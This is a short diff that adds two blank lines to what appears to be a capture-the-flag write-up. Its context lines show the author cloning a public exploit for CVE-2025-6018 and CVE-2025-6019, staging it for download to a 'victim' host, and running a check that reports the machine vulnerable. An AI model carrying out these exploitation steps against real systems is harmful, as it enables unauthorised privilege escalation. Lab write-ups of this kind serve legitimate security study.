@@ -188,6 +188,7 @@ Cloning the exploit:[https://github.com/DesertDemons/CVE-2025-6018-6019.git](htt
 git clone https://github.com/DesertDemons/CVE-2025-6018-6019.git
 ```
 
+
 Hosting it and pulling it to the victim:
 
 ```bash
@@ -210,6 +211,7 @@ phileasfogg3@pterodactyl:~> ./exploit.sh --check
 [!] CVE-2025-6018: VULNERABLE
 [!] CVE-2025-6019: VULNERABLE
 [!] EXPLOIT CHAIN: POSSIBLE
+
 ```
 
 Vulnerable. Let's go.
